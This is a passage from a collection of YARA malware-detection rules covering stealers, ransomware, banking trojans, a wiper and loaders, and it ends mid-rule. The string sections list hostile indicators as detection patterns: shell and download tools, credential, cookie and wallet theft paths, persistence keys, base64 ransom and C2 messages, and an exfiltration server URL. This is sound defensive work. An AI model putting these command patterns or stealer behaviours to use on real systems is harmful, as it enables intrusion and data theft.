rule Suspicious_Golang_Binary
{
  meta:
    description = "Triage: Golang-compiled binary with suspicious OS/persistence/network strings (not family-specific)"
    author = "Tim Machac"
    confidence = "low_to_medium"
    version = "1.0"
    warning = "May hit admin tools; tune/allowlist"
    date = "2025-12-15"
    yarahub_reference_md5 = "87b388da9878e87988c7d89d5cb9c948"
    yarahub_uuid = "bcbf8783-19ef-44f2-abd2-db9d22c900df"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"

  strings:
    // Go indicators (keep a subset here so the rule is standalone)
    $go_buildid = "Go build ID:" ascii
    $rt1 = "runtime.main" ascii
    $rt2 = "runtime.morestack" ascii
    $sym1 = "go.itab." ascii
    $pclntab = "pclntab" ascii
    $moddata = "moduledata" ascii

    // OS execution / LOLBins (Windows + *nix)
    $cmd1 = "cmd.exe /c" ascii
    $cmd2 = "powershell" ascii
    $cmd3 = "rundll32" ascii
    $cmd4 = "wmic " ascii
    $cmd5 = "schtasks" ascii
    $cmd6 = "reg add" ascii
    $cmd7 = "sc create" ascii
    $cmd8 = "/bin/sh" ascii
    $cmd9 = "bash -c" ascii
    $cmd10 = "curl " ascii
    $cmd11 = "wget " ascii

    $cmd12 = "UPX" ascii
    $cmd13 = "GetProcAddress" ascii
    $cmd14 = "VirtualAlloc" ascii
    $cmd15 = "WSAGetOverlappedResult" ascii
    $cmd16 = "timeEndPeriod" ascii

    // Network / exfil-ish HTTP markers
    $http1 = "User-Agent:" ascii
    $http2 = "Authorization: Bearer" ascii
    $http3 = "multipart/form-data" ascii
    $http4 = "POST /" ascii
    $http5 = "GET /" ascii
    $http6 = "Content-Type:" ascii

    // Persistence-ish paths/keywords (light-touch)
    $pers1 = "Microsoft\\Windows\\CurrentVersion\\Run" ascii
    $pers2 = "\\AppData\\Roaming\\" ascii
    $pers3 = "/etc/cron" ascii
    $pers4 = ".ssh/authorized_keys" ascii

  condition:
    // Must look like Go
    ( $go_buildid or (2 of ($rt*) and 1 of ($sym1,$pclntab,$moddata)) or ( $pclntab and $moddata ) )
    and
    // Plus suspicious signals
    ( 2 of ($cmd*) or 3 of ($http*) or 1 of ($pers*) )
}


// ===== Source: yaraify-rules/EXE_Stealer_Phemedrone_Feb2024.yar =====
rule EXE_Stealer_Phemedrone_Feb2024 {
    meta:
        Description = "Detects Phemedrone Stealer malware samples"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Reference = "https://bazaar.abuse.ch/browse/signature/PhemedroneStealer/"
        Hash = "6bccfdbe392cf2eef8a337fbb8af90a662773d8cd73cec1ac1e0f51686840215, 58b525579968cba0c68e8f7ae12e51e0b5542acc2c14a2e75fa6df44556e373f"
        date = "2024-02-10"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "22c2e9caea842dcd382cffa8fe73fff6"
        yarahub_uuid = "f48bf2ef-be21-4993-935f-a63dda092fc6"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.phemedrone_stealer"
    strings:
        $pheme1 = "Phemedrone"
        $pheme2 = "Phemedrone.Services"
        $pheme3 = "Phemedrone.Classes"
        $pheme4 = "Phemedrone.Protections"
        $pheme5 = "Phemedrone.Extensions"

        //Sandbox Detection 
        $vm1 = "AntiVM"
        $vm2 = "IsVM"
        $vm3 = "KillDebuggers"
        $vm4 = "debuggers"

        $pswd1 = "get_MasterPassword" 
        $pswd2 = "FormatPassword"
        $pswd3 = "ParsePasswords"
        $pswd4 = "DiscordList"
        $pswd5 = "PasswordList"
        $pswd6 = "masterPassword"
        $pswd7 = "password"
        $pswd8 = "masterPass"

        $crypto1 = "ParseColdWallets"
        $crypto2 = "CryptoWallets"
        $crypto3 = "ParseDatWallets"

        //Import Libraries found in strings but absent in PE Imports
        $unref1 = "kernel32.dll" 
        $unref2 = "rstrtmgr.dll"
        
       
    condition:
        any of ($pheme*)
        and 2 of ($vm*)
        and 4 of ($pswd*)
        and any of ($crypto*)
        and any of ($unref*)
       
 }


// ===== Source: yaraify-rules/win_agent_tesla_ab4444e9.yar =====
rule win_agent_tesla_ab4444e9 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2020-10-01"
        description               = "detects Agent Tesla"
        hash                      = "dcd7323af2490ceccfc9da2c7f92c54a"
        malpedia_family           = "win.agent_tesla"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "dcd7323af2490ceccfc9da2c7f92c54a"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "ab4444e9-18b1-4920-b105-35377741899f"

    strings:
        $string_1  = "get_CHoo"
        $string_2  = "get_Lenght"
        $string_3  = "get_kbok"
        $string_4  = "get_sSL"
        $string_5  = "get_useSeparateFolderTree"
        $string_6  = "set_AccountCredentialsModel"
        $string_7  = "set_BindingAccountConfiguration"
        $string_8  = "set_CHoo"
        $string_9  = "set_CreateNoWindow"
        $string_10 = "set_IdnAddress"
        $string_11 = "set_IsBodyHtml"
        $string_12 = "set_Lenght"
        $string_13 = "set_MaximumAutomaticRedirections"
        $string_14 = "set_UseShellExecute"
        $string_15 = "set_disabledByRestriction"
        $string_16 = "set_kbok"
        $string_17 = "set_sSL"
        $string_18 = "set_signingEncryptionPreset"
        $string_19 = "set_useSeparateFolderTree"

    condition:
        uint16(0) == 0x5A4D and
        15 of ($string_*)
}


// ===== Source: yaraify-rules/EXE_Stealer_Atlantida.yar =====
rule EXE_Stealer_Atlantida
{
  meta:
    author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
    description = "Detects the Atlantida Stealer malware based on matched strings"
    source = "https://www.rapid7.com/blog/post/2024/01/17/whispers-of-atlantida-safeguarding-your-digital-treasure/, "
    hash = "07f5e74ebd8a4c7edd1812f4c766052239b7da74ca67fd75f143c1f833a4672b"
    date = "2024-01-20"
    yarahub_author_twitter = "@RustyNoob619"
    yarahub_reference_md5 = "f7c5ba27cb34c2dc76ee711a9e57b938"
    yarahub_uuid = "316da0c6-4f95-4a39-8f6c-2bfbafa9b002"
    yarahub_license = "CC0 1.0"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp = "TLP:WHITE"
  
  strings:
    $crypto1 = "Exodus"
    $crypto2 = "Binance"
    $crypto3 = "MetaMask"
    $crypto4 = "BinanceWallet"
    $crypto5 = "Phantom"
    $crypto6 = "sollet"
    $crypto7 = "MetaWallet"
    $crypto8 = "CardWallet"
    $crypto9 = "guildwallet" nocase
    $crypto10 = "TronWallet"
    $crypto11 = "CryptoAirdrops"
    $crypto12 = "Bitoke"
    $crypto13 = "Coin89"
    $crypto14 = "XDefiWallet"
    $crypto15 = "FreaksAxie"
    $crypto16 = "MathWallet"
    $crypto17 = "NiftyWallet"
    $crypto18 = "Guarda"
    $crypto19 = "EQUALWallet"
    $crypto20 = "BitAppWallet"
    $crypto21 = "iWallet"
    $crypto22 = "Wombat"
    $crypto23 = "MEW CX"
    $crypto24 = "Saturn Wallet"
    $crypto25 = "CloverWallet"
    $crypto26 = "LiqualityWallet"
    $crypto27 = "TerraStation"
    $crypto28 = "AuroWallet"
    $crypto29 = "Polymesh Wallet"
    $crypto30 = "ICONex"
    $crypto31 = "NaboxWallet"
    $crypto32 = "Temple"
    $crypto33 = "TezBox"
    $crypto34 = "CyanoWallet"
    $crypto35 = "OneKey"
    $crypto36 = "Leaf Wallet"
    $crypto38 = "BitClip"
    $crypto39 = "NashExtension"
    $crypto40 = "HyconLiteClient"
    $creds1 = "config.vdf"
    $creds2 = "loginusers.vdf"
    $creds3 = "User:"
    $creds4 = "Password:"
    $creds5 = "Host:"
    $othr1 = "Steam"
    $othr2 = "\\Telegram Desktop\\tdata"
    $othr3 = "\\Network\\Cookies"
    $othr4 = "encrypted_key"
    $othr5 = "password_manager"
    $othr6 = "\\Login Data"
    $othr7 = "\\Local Extension Settings\\"
    $othr8 = "\\History"
    $othr9 = "moz_cookies"
    $wide1 = "Wallets\\" wide
    $wide2 = "Browsers\\Tokens\\" wide
    $wide3 = "Browsers\\Cards\\" wide
    $wide4 = "Browsers\\Autofills\\" wide
    $wide5 = "Browsers\\History\\" wide
    $wide6 = "Browsers\\Cookies\\Cookies_" wide
    $wide7 = "Browsers\\BroweserInfo.txt" wide
    $wide8 = "Passwords.txt" wide
    $wide9 = "Log Information.txt" wide
    $wide10 = "All domain.txt" wide
    $wide11= "FileZilla\\Servers.txt" wide
    $wide12= "User Information.txt" wide
    $wide13= "Geo Information.txt" wide

  condition:
    uint16(0) == 0x5A4D
    and 30 of ($crypto*)
    and 2 of ($creds*)
    and 5 of ($othr*)
    and 7 of ($wide*)
}


// ===== Source: yaraify-rules/Android_BankingTrojan_Hydra.yar =====
rule Android_BankingTrojan_Hydra
{
    meta:
        description = "Detects Hydra Android malware samples based on the strings matched"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        hash = "789d04c93488adf85d8d7988c0d050648cd91ad469f9e63e04d290523dfb1d93"
        date = "2024-01-22"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "c8c78623627fe4577e4f51871b47a1c2"
        yarahub_uuid = "c3a411c2-cdf3-4f0e-8f86-5adfd803dcce"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "apk.hydra"
    strings:
        $anrd = "AndroidManifest.xml"

        $per1 = "android.permission.FOREGROUND_SERVICE" 
        $per2 = "android.permission.REORDER_TASKS"
        $per3 = "android.permission.RECEIVE_SMS"
        $per4 = "android.permission.SEND_SMS"
        $per5 = "android.permission.CALL_PHONE"
        $per6 = "android.permission.WAKE_LOCK"
        $per7 = "android.permission.SYSTEM_ALERT_WINDOW"
        $per8 = "android.permission.ACCESS_WIFI_STATE"
        $per9 = "android.permission.CAPTURE_VIDEO_OUTPUT"
        $per10 = "android.permission.DISABLE_KEYGUARD"
        $per11 = "android.permission.ACCESS_NETWORK_STATE"
        $per12 = "android.permission.INTERNET"
        $per13 = "android.permission.READ_EXTERNAL_STORAGE"
        $per14 = "android.permission.WRITE_EXTERNAL_STORAGE"
        $per15 = "android.permission.REQUEST_INSTALL_PACKAGES"
        $per17 = "android.permission.REQUEST_DELETE_PACKAGES"
        $per18 = "android.permission.ACTION_MANAGE_OVERLAY_PERMISSION"
        $per19 = "android.permission.QUERY_ALL_PACKAGES"
        $per20 = "android.permission.WRITE_SETTINGS"

        $int1 = "android.intent.action.USER_PRESENT" 
        $int2 = "android.intent.action.PACKAGE_ADDED"
        $int3 = "android.intent.action.PACKAGE_REMOVED"
        $int4 = "android.intent.action.SCREEN_ON"
        $int5 = "android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"
        $int6 = "android.intent.action.QUICKBOOT_POWERON"
        $int7 = "android.intent.action.DREAMING_STOPPED"
        $int8 = "android.intent.action.RESPOND_VIA_MESSAGEprovider"
        $int9 = "android.intent.action.SCREEN_ON"

        $instr1 = "Uninstall"
        $instr2 = "Your ID"
        $instr3 = "lock screen"
        $instr4 = "protection"
        $instr5 = "turn off"
        $instr6 = "volume down"
        $instr7 = "instruction_step_"
        $instr8 = "permissions_dialog_message"
        $instr9 = "permissions_dialog_title"
        $instr10 = "volume up"

        $grnd1 = "com.grand.brothan" wide
        $grnd2 = "com.grand.snail.core.injects_core.CHandler"
        $grnd3 = "com.grand.snail.core.injects_core.Worker"
        $grnd4 = "com.grand.snail.core.injects_core.Screen"
        $grnd5 = "com.grand.snail.WebViewActivity"
        $grnd6 = "com.grand.snail.MainActivity"
        $grnd7 = "com.grand.snail.bot.components.locker.LockerActivity"
        $grnd8 = "com.grand.snail.bot.HelperAdmin"
        $grnd9 = "com.grand.snail.bot.components.injects.system.FullscreenOverlayService"
        $grnd10 = "com.grand.snail.bot.components.commands.NLService"
        $grnd11 = "com.grand.snail.bot.receivers.MainReceiver"
        $grnd12 = "com.grand.snail.core.PeriodicJobService"
        $grnd13 = "com.grand.snail.bot.sms.MmsReceiver"
        $grnd14 = "com.grand.snail.bot.sms.HeadlessSmsSendService"
        $grnd15 = "com.grand.snail.provider"
        
    condition:
        $anrd
        and 15 of ($per*) 
        and 6 of ($int*)
        and 6 of ($instr*)
        and 10 of ($grnd*)
}


// ===== Source: yaraify-rules/DetectEncryptedVariants.yar =====
rule DetectEncryptedVariants
{
    meta:
        description = "Detects 'encrypted' in ASCII, Unicode, base64, or hex-encoded"
        author = "Zinyth"
        date = "2025-06-20"
	Description = "This rule is meant to catch different types of ransomware."
	date = "2024-09-02"
	yarahub_reference_md5 = "b0fd45162c2219e14bdccab76f33946e"
	yarahub_uuid = "0d185fc2-9c49-498e-b7ce-b28db1b9f36b"
	yarahub_license = "CC0 1.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        // Plain ASCII
        $ascii = "encrypted" nocase

        // UTF-16LE (little endian)
        $unicode_le = "e\x00n\x00c\x00r\x00y\x00p\x00t\x00e\x00d\x00" nocase

        // UTF-16BE (big endian)
        $unicode_be = "\x00e\x00n\x00c\x00r\x00y\x00p\x00t\x00e\x00d" nocase

        // Base64: 'encrypted' -> 'ZW5jcnlwdGVk'
        $base64 = "ZW5jcnlwdGVk"

        // Hex encoded as ASCII: 'encrypted' -> '656E63727970746564'
        $hex = "656E63727970746564"

    condition:
        any of them
}


// ===== Source: yaraify-rules/ItsSoEasy_Ransomware.yar =====
rule ItsSoEasy_Ransomware {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "96513a1b-0870-49c2-9b67-07dd84cf303c"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1ce280542553dc383b768b9189808e27"
    
	strings:
		$typ1 = "itssoeasy" nocase
		$typ1_wide = "itssoeasy" nocase wide
		$typ2 = "itssoeasy" base64
		$typ3 = "ItsSoEasy" base64

		// C2 communication message strings
		// well this sucks, ha!
		$c2m1 = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  
		// has this idiot payed the ransom?               
		$c2m2 = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="
		// oh, you're good!
		$c2m3 = "b2gsIHlvdSdyZSBnb29kIQ=="          
		// money, money, money!           
		$c2m4 = "bW9uZXksIG1vbmV5LCBtb25leSE="        
		// i need this to fuck you up!         
		$c2m5 = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"   
		// --KEY-PROCEDURE--      
		$c2m6 = "LS1LRVktUFJPQ0VEVVJFLS0="                     
		
		// Base64 encoded message strings
		// Decrypt files now?
		$tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"
		// Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
		$tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"
		// Now your data is lost
		$tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0" 
		// It was as easy as I said, ha?
		$tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8=" 

		// file names and typical ransom filetype
		$fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0" // /if_you_change_this_file_your_data_is_lost
		// /identifier
		$fileident = "L2lkZW50aWZpZXI=" 
		// .itssoeasy                                        
		$filetype = "Lml0c3NvZWFzeQ==" 
		$fileransom = "itssoeasy.html"

		// CMD print messages
		$cmd1 = "Welcome to the Google connector!\nPlease wait while the installer runs..."
		$cmd2 = "Do not destroy the current process, otherwise your data will be irreversibly encrypted."
		$cmd3 = "Please use the instructions in the .html file on your Desktop or your Home-Directory to decrypt your data"
		$cmd4 = "If you payed, this window will automatically check and decrypt your data."
		$cmd5 = "Wow! You're good. Now i will recover your files!\n => Do not kill this process, otherwise your data is lost!"
		$cmd6 = "Your files has been decrypted!\nThank you and Goodbye."

    condition:
        any of ($typ*) and all of ($c2*, $tkmsg*, $file*, $cmd*)
}


// ===== Source: yaraify-rules/PowerShell_XOR_Function_Specific.yar =====
rule PowerShell_XOR_Function_Specific
{
    meta:
        description = "Detects a specific PowerShell function that performs XOR encoding and decoding."
        author = "Gemini"
        date = "2025-08-29"
        reference = "Internal Research"
	yarahub_reference_md5 = "598fda378d66cc1b703b4e2f4790ae98"
	yarahub_uuid = "5615f3a5-95cf-477c-982f-6105289d27e3"
	yarahub_license = "CC0 1.0"
	yarahub_rule_matching_tlp = "TLP:WHITE"
	yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        // Function definition and parameters
        $func = "function xor{ param($string, $method, $key)" ascii wide

        // Key operations
        $op_bxor = "-bxor $xorkey" ascii wide
        $op_b64_decode = "[System.Convert]::FromBase64String($string)" ascii wide
        $op_b64_encode = "[System.Convert]::ToBase64String($xordData)" ascii wide
        $op_replace = "-replace '/', '_'" ascii wide
        $op_encoding = "[System.Text.Encoding]::UTF8" ascii wide

    condition:
        // A high-confidence match requires the function definition, the core XOR operation,
        // and at least two other characteristic operations.
        $func and $op_bxor and 2 of ($op_b64_decode, $op_b64_encode, $op_replace, $op_encoding)
}


// ===== Source: yaraify-rules/MarioLocker.yar =====
rule MarioLocker {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-08-24"
        description = "Detects MarioLocker Ransomware"
        yarahub_uuid = "b80e9415-6edc-4be9-a6d6-053b5eacc2af"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6f53f99b0a19150d53244d691dd04e80"
    
    strings:
        $RansomHouse = "Welcome to the RansomHouse" ascii
        $RansomNote = "How To Restore Your Files.txt" ascii
        $EncryptedFiles = "Encrypted files: %d" ascii
        $ext = ".mario" ascii

    condition:
        all of them and
        uint16(0) == 0x457f
}


// ===== Source: yaraify-rules/win_originbot.yar =====
rule win_originbot
{
  meta:
    author                    = "andretavare5"
    description               = "Detects OriginBot(net) / OriginLoader malware."
    org                       = "Bitsight"
    date                      = "2024-01-04"
    yarahub_license           = "CC BY-NC-SA 4.0"
    yarahub_uuid              = "e42f46dc-f20a-4f62-96bf-83e279749b99"
    yarahub_rule_matching_tlp = "TLP:WHITE"
    yarahub_rule_sharing_tlp  = "TLP:WHITE"
    yarahub_reference_md5     = "956e9017817d45887c738b82fdf47f4a"
    yarahub_reference_link    = "https://www.fortinet.com/blog/threat-research/originbotnet-spreads-via-malicious-word-document"
    yarahub_malpedia_family   = "win.originbot"
    yarahub_author_twitter    = "@andretavare5"

  strings:
    $str1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0" fullword wide ascii
    $str2 = "application/x-www-form-urlencoded" fullword wide ascii
    $str3 = "x-key" fullword wide ascii nocase
    $str4 = "POST" fullword wide ascii
    $str5 = "p=" fullword wide ascii
    $str6 = "TripleDES" fullword wide ascii
    $str7 = "downloadexecute" fullword wide ascii

  condition:
    uint16(0) == 0x5A4D and // MZ header
    filesize > 20KB and filesize < 500KB and
    all of them
}


// ===== Source: yaraify-rules/botnet_mortem_qbot_gafgyt.yar =====
rule botnet_mortem_qbot_gafgyt
{
    meta:
        description = "Some strings that stand out from a publicly-available botnet source code (Mortem-qBot-Botnet-Src)"
        author = "cip"
        family = "Gafgyt"
        date = "2025-06-02"
        yarahub_uuid = "9475efad-e517-4aca-92ce-2e1419a5c809"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "334a50e61b94fd70971bee04d0a99a43"

    strings:
        $yakuza = "YakuzaBotnet"
        $scarface = "Scarface1337"

    condition:
        $yakuza or $scarface
}


// ===== Source: yaraify-rules/DelBat1.yar =====
rule DelBat1
{
    meta:
        author = "Madhav"
        description = "This is a bat file which deletes the malicious file after the malicious files are executed"
        date = "2025-06-02"
	yarahub_reference_md5 = "0CCD4E0F8639AB3DB3C45B2768A41AFB"
	yarahub_uuid = "58ff8b5e-192e-4144-af8e-f29d282d1c70"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    
    strings:
        $mal1 = "chcp 65001"
        $mal2 = "del /a /q /f"
        $mal3 = "\\AppData\\Local\\Temp\\"
        $mal4 = ".exe"
        $mal5 = ".bat"
          
    condition:
        ($mal1 and $mal2 and $mal3 and $mal4 and $mal5) or ($mal2 and $mal3 and $mal4 and $mal5)
}


// ===== Source: yaraify-rules/private_string_search.yar =====
rule private_string_search {
    meta:
        date = "2025-12-08"
        yarahub_reference_md5 = "c4b6d8ffc103f65cbb533ad8aa659bcb"
        yarahub_uuid = "2a5b8100-7c23-4d44-8742-991df9960241"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE" 
        yarahub_rule_sharing_tlp = "TLP:WHITE" 
        author = "Researcher_Name"
        description = "Hunting for specific text strings"

    strings:
        $s1 = "x-apikey" ascii wide nocase
        $s2 = "virustotal.com" ascii wide nocase

    condition:
        $s1 and $s2
}


// ===== Source: yaraify-rules/BatModifier3.yar =====
rule BatModifier3
{
    meta:
        author = "Madhav"
        description = "This is a bat file which is setup a game. 49509"
        date = "2025-05-10"
	yarahub_reference_md5 = "79a546f11d5ed65736735ba86cb95213"
	yarahub_uuid = "40a63190-bedb-445f-ad61-bf142ed03ca3"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    
    strings:
        $mal1 = "PowerShell -Command \"Start-Process '%~f0' -Verb runAs\""

        $mal3 = "Invoke-WebRequest -Uri"
        $mal4 = "%SystemRoot%\\System32\\drivers\\etc\\hosts"
        $mal5 = "netsh advfirewall firewall add rule"

	$mal7 = "%SystemRoot%\\System32\\curl.exe"
	$mal8 = "shell \"su -c 'id'\""
	$mal15 = "uid=0(root)"
	$mal10 = "TaskKill /F /IM"
	$mal11 = "reg delete"
	$mal12 = "rd /"
	$mal13 = "copy /"
	$mal14 = "del /"
    
    condition:
        all of ($mal1, $mal3, $mal4, $mal5, $mal7) and 2 of ($mal8, $mal15, $mal10, $mal11, $mal12, $mal13, $mal14)
}


// ===== Source: yaraify-rules/lockbitblack_ransomnote.yar =====
rule lockbitblack_ransomnote {
    meta:
        date = "2022-07-02"
        description = "Hunting rule for LockBit Black/3.0 ransom notes"
        yarahub_author_twitter = "@captainGeech42"
        yarahub_uuid = "cc2308df-9b42-4169-8146-c63b0bc6b1f7"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "954d81de1c53158b0050b38d4f4b4801"
    strings:
        $s1 = "~~~ LockBit 3.0" ascii wide
        $s2 = "the world's fastest and most stable" ascii wide
        $s3 = "http://lockbitapt" ascii wide
        $s4 = ">>>>> Your data is stolen and encrypted" ascii wide
    condition:
        filesize < 20KB and 2 of them and #s3 > 10
}


// ===== Source: yaraify-rules/Updater.yar =====
rule Updater
{
    meta:
        description = "Detects a malware script with specific characteristics and strings such as Updater"
        author = "Malman"
        date = "2025-10-30"
        version = "1.0"
        yarahub_reference_md5 = "083668d72eab0f8f2f21522bf286a913"
        yarahub_uuid = "2c4e8a1f-3b7c-4d5e-9f6a-1b0d2a3c4e5f"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $a = "logfile=C:\\wormlog.txt"
        $b = "targetdir=C:\\Users"
        $c = "encryptionkey=MySecretKey123"
        $d = "remoteaccessport=4444"
        $e = "remoteaccesspassword=Password123"
        $f = "ransomnote=C:\\ransom_note.txt"
        $g = "exfiltrationserver=http://64.246.123.125:3000/upload"
        $h = "keylogfile=C:\\keylogs.txt"
        $i = "credentialfile=C:\\credentials.txt"
        $j = "maliciouspayload=C:\\malicious_payload.exe"
        $k = "additionalpayload=C:\\additional_payload.exe"
        $l = "corruptionfile=C:\\corruption_data.bin"
        $m = "screenshotdir=C:\\screenshots"
        $n = "micrecordingsdir=C:\\micrecordings"
        $o = "webcamvideosdir=C:\\webcamvideos"
        $p = "additionalmaliciousfile=C:\\additional_malicious_file.exe"
        $q = "additionalcorruptionfile=C:\\additional_corruption_data.bin"
        $r = "additionalkeylogfile=C:\\additional_keylogs.txt"
        $s = "additionalcredentialfile=C:\\additional_credentials.txt"
        $t = "additionalransomnote=C:\\additional_ransom_note.txt"
        $u = "additionalexfiltrationserver=http://64.246.123.125:3000/upload"
        $v = "additionalmicrecordingsdir=C:\\additional_micrecordings"
        $w = "additionalwebcamvideosdir=C:\\additional_webcamvideos"
        $x = "certutil -encode"
        $y = "schtasks /create"
        $z = "powershell -Command"

    condition:
        10 of them
}


// ===== Source: yaraify-rules/DynoWiper.yar =====
rule DynoWiper
{
meta:
author = "CERT Polska"
yarahub_reference_md5 = "a727362416834fa63672b87820ff7f27"
yarahub_uuid = "6e8a1b4a-5a3e-47ef-9785-95852a9ea794"
yarahub_license = "CC0 1.0"
yarahub_rule_matching_tlp = "TLP:WHITE"
yarahub_rule_sharing_tlp = "TLP:WHITE"
date = "2025-12-31"
hash = "4ec3c90846af6b79ee1a5188eefa3fd21f6d4cf6"
hash = "86596a5c5b05a8bfbd14876de7404702f7d0d61b"
hash = "69ede7e341fd26fa0577692b601d80cb44778d93"
hash = "0e7dba87909836896f8072d213fa2da9afae3633"
strings:
$a1 = "$recycle.bin" wide
$a2 = "program files(x86)" wide
$a3 = "perflogs" wide
$a4 = "windows\x00" wide
$b1 = "Error opening file: " wide
condition:
uint16(0) == 0x5A4D
and
filesize < 500KB
and
4 of them
}


// ===== Source: yaraify-rules/StealerDLL_Amadey.yar =====
rule StealerDLL_Amadey {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-07-28"
        description = "Detects Amadey's Stealer DLL"
        yarahub_uuid = "a39bd717-10a6-4851-b916-87decfd9d167"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "d4944b1c2a2636220b189ab9b8dbbc00"
        malpedia_family = "win.amadey"
    strings:
        $StealerDLL_pdb = "D:\\Mktmp\\StealerDLL\\x64\\Release\\STEALERDLL.pdb"
        $StealerDLL_dll = "STEALERDLL.dll"
        $powershell = "powershell -Command Compress-Archive -Path"
    condition:
        uint16(0) == 0x5a4d and
	($StealerDLL_pdb or 
	$StealerDLL_dll) and 
	$powershell
}


// ===== Source: yaraify-rules/OleTrojan.yar =====
rule OleTrojan
{
    meta:
        author = "Madhav"
        description = "This is a ole file which is accessing some url. 49496"
        date = "2025-05-09"
	yarahub_reference_md5 = "7a8c0555498fa12e5ae846f7e5dd0dbf"
	yarahub_uuid = "9e2f0ead-9358-4479-8831-26e4d51812e2"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    
    strings:
        $mal1 = "LinkFormat.SourceFullName"
        $mal2 = "Sub Document_Open"
        $mal3 = "ADODB.Stream"
        $mal4 = "InternetExplorer.Application"
        $mal5 = "SetForegroundWindow"
        $mal6 = "Content-Type: application/x-www-form-urlencoded"
    
    condition:
        $mal1 and $mal2 and $mal3 and $mal4 and $mal5 and $mal6
}


// ===== Source: yaraify-rules/yarahub_win_remcos_rat_unpacked_aug_2023.yar =====
rule yarahub_win_remcos_rat_unpacked_aug_2023
{
	meta:
		author = "Matthew @ Embee_Research"
		yarahub_author_twitter = "@embee_research"
		desc = "Detects bytecodes present in Amadey Bot Samples"
		sha_256 = "ec901217558e77f2f449031a6a1190b1e99b30fa1bb8d8dabc3a99bc69833784"
		date = "2023-08-27"
        yarahub_uuid = "f701cf05-ac09-44f3-b4ee-3ea944bd5533"
       	yarahub_license = "CC BY-NC 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "57b00a449fc132c2f5d139c6d1cee7cd"
        malpedia_family = "win.remcos"
		
	strings:
		$r0 = " ______                              " ascii
		$r1 = "(_____ \\                             " ascii
		$r2 = " _____) )_____ ____   ____ ___   ___ " ascii 
		$r3 = "|  __  /| ___ |    \\ / ___) _ \\ /___)" ascii
		$r4 = "| |  \\ \\| ____| | | ( (__| |_| |___ |" ascii
		$r5 = "|_|   |_|_____)_|_|_|\\____)___/(___/ " ascii
		
		$s1 = "Watchdog module activated" ascii
		$s2 = "Remcos restarted by watchdog!" ascii
